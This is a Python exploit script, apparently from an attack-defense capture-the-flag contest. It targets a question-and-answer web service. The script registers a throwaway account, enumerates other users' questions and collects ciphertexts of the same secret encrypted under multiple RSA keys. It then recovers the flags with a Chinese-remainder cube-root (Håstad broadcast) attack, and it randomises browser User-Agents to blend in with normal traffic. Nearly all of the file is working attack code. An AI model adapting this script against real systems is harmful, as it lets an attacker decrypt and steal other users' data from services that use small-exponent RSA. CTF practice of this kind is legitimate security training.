import base64
import os
import random
import re
import string
import sys

import gmpy2
import libnum
import requests

""" <config> """
PORT = 8080
# DEBUG -- logs to stderr, TRACE -- log HTTP requests
DEBUG = os.getenv("DEBUG", False)
TRACE = os.getenv("TRACE", False)
""" </config> """


def find_cube_root(ciphertexts, modulus):
    x = libnum.solve_crt(ciphertexts, modulus)
    cube_root = gmpy2.iroot(x, 3)
    return cube_root


class FakeSession(requests.Session):
    """
    FakeSession reference:
        - `s = FakeSession(host, PORT)` -- creation
        - `s` mimics all standard request.Session API except of fe features:
            -- `url` can be started from "/path" and will be expanded to "http://{host}:{PORT}/path"
            -- for non-HTTP scheme use "https://{host}/path" template which will be expanded in the same manner
            -- `s` uses random browser-like User-Agents for every requests
            -- `s` closes connection after every request, so exploit get splitted among multiple TCP sessions
    Short requests reference:
        - `s.post(url, data={"arg": "value"})`          -- send request argument
        - `s.post(url, headers={"X-Boroda": "DA!"})`    -- send additional headers
        - `s.post(url, auth=(login, password)`          -- send basic http auth
        - `s.post(url, timeout=1.1)`                    -- send timeouted request
        - `s.request("CAT", url, data={"eat":"mice"})`  -- send custom-verb request
        (response data)
        - `r.text`/`r.json()`  -- text data // parsed json object
    """

    USER_AGENTS = [
        """Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15""",
        """Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36""",
        """Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201""",
        """Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.13; ) Gecko/20101203""",
        """Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0""",
    ]

    def __init__(self, host, port):
        super(FakeSession, self).__init__()
        if port:
            self.host_port = "{}:{}".format(host, port)
        else:
            self.host_port = host

    def prepare_request(self, request):
        r = super(FakeSession, self).prepare_request(request)
        r.headers["User-Agent"] = random.choice(FakeSession.USER_AGENTS)
        r.headers["Connection"] = "close"
        return r

    # fmt: off
    def request(self, method, url,
                params=None, data=None, headers=None,
                cookies=None, files=None, auth=None, timeout=None, allow_redirects=True,
                proxies=None, hooks=None, stream=None, verify=None, cert=None, json=None,
                ):
        if url[0] == "/" and url[1] != "/":
            url = "http://" + self.host_port + url
        else:
            url = url.format(host=self.host_port)
        r = super(FakeSession, self).request(
            method, url, params, data, headers, cookies, files, auth, timeout,
            allow_redirects, proxies, hooks, stream, verify, cert, json,
        )
        if TRACE:
            print("[TRACE] {method} {url} {r.status_code}".format(**locals()))
        return r
    # fmt: on


def rand_string(n=12, alphabet=string.ascii_uppercase + string.ascii_lowercase + string.digits):
    return ''.join(random.choice(alphabet) for _ in range(n))


def _register(s, name):
    r = s.post(
        "/api/v1/auth/register",
        data=dict(
            username=name
        ),
    )

    token = r.json()["redirect"][10:]

    return token


def exploit(host: str):
    s = FakeSession(host, PORT)

    name = rand_string()
    _register(s, name)

    r = s.get(
        "/api/v1/users"
    )

    users = r.json()["users"][-10:]
    # print("USERS: ", users)
    flags = []
    for user in users:
        r = s.get(
            "/api/v1/users/questions/ask"
        )

        books_name = [b["Name"] for b in r.json()["books"]]
        # print("BOOKS: ", books_name)

        r = s.get(
            "/api/v1/users/questions",
            params=dict(
                username=user
            ),
        )
        if r.status_code == 200:
            questions_id = [q["ID"] for q in r.json()["questions"]]
            # print("QUESTIONS: ", questions_id)

            for q_id in questions_id:
                public_keys = []
                ciphers = []
                for book in books_name:

                    r = s.get(
                        "/api/v1/users/questions/otherAnswer",
                        params=dict(
                            id=q_id,
                            id_book=book,
                        ),
                    )
                    if r.status_code == 200:
                        public_keys.append(int(r.json()["PubKey"]["PublicKey"]["Mod"]))
                        ciphers.append(int.from_bytes(base64.b64decode(r.json()["Question"]), "big"))
                x = find_cube_root(ciphers, public_keys)
                if x[1]:
                    flags.append(libnum.n2s(int(x[0])))
    return flags


def main():
    flags = exploit(sys.argv[1])

    for flag in flags:
        match = re.match(r"([A-Z0-9]{31}=)", flag)
        if match:
            print(flag)


if __name__ == "__main__":
    main()
